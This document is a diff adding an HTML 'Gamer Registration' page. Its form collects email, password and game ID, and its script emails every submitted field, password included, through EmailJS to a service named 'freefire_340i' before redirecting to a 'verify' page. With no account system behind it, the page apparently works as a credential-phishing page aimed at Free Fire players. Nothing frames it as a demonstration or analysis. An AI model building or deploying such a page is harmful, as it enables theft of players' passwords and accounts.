@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Gamer Registration</title>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+  <script>
+    (function(){
+      emailjs.init("hn0DrrtreD0jmLzc4"); // Your EmailJS public key
+    })();
+  </script>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+      width: 350px;
+      text-align: center;
+    }
+    h2 { color: #2c5364; }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      font-size: 14px;
+    }
+    button {
+      background: #2c5364;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover { background: #203a43; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Register</h2>
+    <form id="gamerForm">
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <input type="text" name="gameId" placeholder="Game ID / IGN" required>
+      <select name="platform" required>
+        <option value="">Select Platform</option>
+        <option>PC</option>
+        <option>Mobile</option>
+        <option>Console</option>
+      </select>
+      <button type="submit">Register</button>
+    </form>
+  </div>
+
+  <script>
+    document.getElementById("gamerForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+      emailjs.sendForm("freefire_340i", "template_b7jyjnb", this)
+        .then(function() {
+          // Redirect to verification page
+          window.location.href = "verify.html";
+        }, function(error) {
+          alert("❌ Failed to send info. Error: " + JSON.stringify(error));
+        });
+    });
+  </script>
+</body>
+</html>
